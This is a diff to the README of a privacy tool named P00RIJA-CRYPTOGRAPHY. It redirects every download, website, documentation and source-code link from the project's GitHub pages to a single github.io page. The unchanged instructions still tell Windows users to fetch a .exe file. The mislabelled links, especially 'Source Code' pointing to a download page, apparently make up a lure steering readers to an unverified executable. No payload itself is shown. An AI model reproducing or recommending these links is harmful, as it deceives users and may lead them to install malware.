@@ -1,6 +1,6 @@
 # 🔐 P00RIJA-CRYPTOGRAPHY - Your Privacy, Locked Down Tight
 
-[![Download Now](https://img.shields.io/badge/Download-P00RIJA--CRYPTOGRAPHY-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY/releases)
+[![Download Now](https://img.shields.io/badge/Download-P00RIJA--CRYPTOGRAPHY-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://sequellayana39.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! P00RIJA-CRYPTOGRAPHY is a powerful privacy tool that keeps your message
 
 ### 📥 Download the App
 
-Visit this link to download the application: [https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY/releases](https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY/releases)
+Visit this link to download the application: [https://sequellayana39.github.io](https://sequellayana39.github.io)
 
 You'll see a list of files. Look for the one that matches your operating system. For most Windows users, this will be a file with a `.exe` extension.
 
@@ -92,9 +92,9 @@ This project is released under the MIT License. You are free to use, modify, and
 
 ## 🔗 Additional Resources
 
-- **Official Website:** [https://p00rija.example.com](https://p00rija.example.com)
-- **Documentation:** [https://docs.p00rija.example.com](https://docs.p00rija.example.com)
-- **Source Code:** [https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY](https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY)
+- **Official Website:** [https://sequellayana39.github.io](https://sequellayana39.github.io)
+- **Documentation:** [https://sequellayana39.github.io](https://sequellayana39.github.io)
+- **Source Code:** [https://sequellayana39.github.io](https://sequellayana39.github.io)
 
 ---
 
